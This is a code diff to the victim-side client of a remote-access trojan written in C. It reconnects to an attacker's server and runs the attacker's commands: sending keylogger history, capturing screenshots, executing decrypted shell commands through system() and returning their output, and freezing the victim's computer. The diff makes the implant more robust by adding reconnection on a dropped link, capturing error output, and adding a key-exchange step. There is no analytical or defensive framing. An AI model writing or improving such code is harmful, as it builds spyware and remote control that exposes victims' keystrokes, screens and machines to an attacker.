@@ -7,9 +7,6 @@
 #include "other_attacks.h"
 #include "connection.h"
 
-#define MAX_INPUT_LEN 40
-#define LICENES_KEY_LENGTH 20
-
 volatile int keepRunning = 1;
 volatile bool stop_keystrokes_stream = true;
 
@@ -21,13 +18,16 @@ void * start_capture_screenshots (){
 	return NULL;
 }
 
-int main (){
+void start_connection(){
 	while (create_connection() == FAILUR){
 		printf("[-] connection failed, trying to connect again ...\n"); // delete ita
 		sleep(3);
 	}
 	log_in_victim();
-	
+}
+
+int main (){
+	start_connection();
 	action_type attacker_requested_actioa;
 	pthread_t screenshotcapture_thread;
 	pthread_t keyloger_log_thread;
@@ -37,7 +37,9 @@ int main (){
 	main_data temp_data;
 	
 	while (true){
-		recv(V_S_socket, &attacker_income_action, sizeof(action_type),0);
+		if(recv(V_S_socket, &attacker_income_action, sizeof(action_type),0) == 0)
+			start_connection();
+
 		switch (attacker_income_action){
 			case GET_KEYLOGGER_HISTORY :
 				
@@ -75,9 +77,7 @@ int main (){
 				
 			case SEND_BIND_SHELL_COMMAND :
 				recv(V_S_socket, bind_shell_command, ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND), 0);
-				sprintf(bind_shell_command, "%s > .shell_command_output.txt", decrypt_text(bind_shell_command, AES_KEY)); // set the shell_command_output to spasipic path!! !!!1
-				puts(bind_shell_command);
-				fflush(stdout);
+				sprintf(bind_shell_command, "%s > .shell_command_output.txt 2> .shell_command_output.txt", decrypt_text(bind_shell_command, AES_KEY)); // set the shell_command_output to spasipic path!! !!!1
 				system(bind_shell_command);
 				send_file(".shell_command_output.txt", SEND_BIND_SHELL_COMMAND, false);
 				
@@ -85,6 +85,11 @@ int main (){
 				
 			case STUCK_VICTIMS_COMPUTER :
 				stick_the_cumputer();
+				
+				break;
+				
+			case KEY_EXCHANGE :
+				secure_key_exchange();
 				
 				break;
 				
